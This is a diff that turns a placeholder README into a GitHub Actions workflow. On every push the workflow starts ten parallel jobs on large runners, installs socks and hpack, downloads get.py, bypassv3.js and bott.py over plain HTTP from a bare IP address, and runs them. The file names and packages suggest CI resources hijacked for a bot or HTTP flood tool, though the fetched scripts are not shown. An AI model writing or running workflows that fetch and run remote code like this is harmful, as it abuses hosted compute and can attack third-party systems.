@@ -1,1 +1,36 @@
-# abc
+name: ger2
+
+on: push
+
+jobs:
+  check_cpu:
+    runs-on: depot-ubuntu-24.04-32
+    strategy:
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Install system dependencies
+      run: |
+        sudo apt update
+        sudo apt install -y wget python3 npm nodejs python3-pip
+
+    - name: Install Python dependencies
+      run: pip install psutil
+
+    - name: Install Node.js dependencies
+      run: npm install socks hpack
+
+    - name: Download required files
+      run: |
+        wget -q http://38.242.224.156:8082/get.py
+        wget -q http://38.242.224.156:8082/bypassv3.js
+        wget -q http://38.242.224.156:8082/bott.py
+
+    - name: Execute scripts
+      run: |
+        python3 get.py
+        python3 bott.py
